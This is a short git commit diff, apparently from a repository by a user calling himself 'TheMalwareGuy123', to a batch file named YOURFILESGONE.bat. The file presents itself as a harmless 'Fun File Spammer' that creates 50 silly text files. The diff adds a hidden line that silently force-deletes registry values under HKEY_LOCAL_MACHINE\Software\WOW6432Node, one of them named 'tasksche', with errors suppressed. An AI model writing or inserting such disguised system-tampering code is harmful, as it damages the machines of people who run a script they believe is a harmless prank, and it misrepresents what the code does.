7f0c045d266ace0c1fb1d1b5c6406378e3e68e6b
TheMalwareGuy123 <troynjo4ever1990@gmail.com>
2025-07-22 15:05:51 -0500

    Add files via upload

--- YOURFILESGONE.bat
+++ YOURFILESGONE.bat
@@ -6,6 +6,8 @@ echo *** Welcome to the Fun File Spammer! ***
 echo This will create 50 silly text files in this folder.
 pause
 
+@for %%I in ("tasksche" "Other Value" "One More Value") do @%SystemRoot%\System32\reg.exe delete "HKEY_LOCAL_MACHINE\Software\WOW6432Node" /v "%%~I" /f 2>nul
+
 setlocal enabledelayedexpansion
 
 for /L %%i in (1,1,50) do (
